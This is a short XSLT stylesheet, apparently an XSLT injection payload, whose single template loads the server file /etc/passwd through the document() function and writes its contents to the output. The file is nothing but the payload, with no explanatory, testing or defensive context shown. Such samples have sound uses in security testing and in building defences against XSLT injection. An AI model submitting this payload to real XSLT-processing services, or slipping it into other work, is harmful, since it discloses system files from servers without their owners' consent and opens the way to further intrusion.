<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:variable name="file" select="document('file:///etc/passwd')" />
    <xsl:value-of select="$file" />
  </xsl:template>
</xsl:stylesheet>
